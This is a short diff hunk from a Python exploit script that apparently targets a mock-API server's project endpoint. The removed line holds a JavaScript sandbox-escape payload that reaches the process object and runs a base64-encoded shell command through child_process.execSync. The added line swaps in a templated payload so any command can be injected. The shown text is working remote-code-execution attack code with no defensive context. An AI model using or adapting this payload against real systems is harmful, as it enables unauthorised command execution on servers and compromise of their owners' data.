@@ -49,7 +49,7 @@ def main(target):
         #print(projid)
         payload = defaultpayload.replace("d2hvYW1p", base64.b64encode(cmd.encode()).decode())
         data = {
-            "id":projid,"project_mock_script":"const sandbox = this;const ObjectConstructor = this.constructor;const FunctionConstructor = ObjectConstructor.constructor;;const Buffer =  new FunctionConstructor('return Buffer')();const process = new FunctionConstructor('return process')();;cmd  = new Buffer('d2hvYW1p','base64').toString();;mockJson = new Buffer(process.mainModule.require(\"child_process\").execSync(cmd).toString()).toString('base64')","is_mock_open":True
+            "id":projid,"project_mock_script":payload,"is_mock_open":True
         }
         up = requests.post(url+"/api/project/up",headers=header,timeout=5,data=json.dumps(data)).json()
         #print(up)
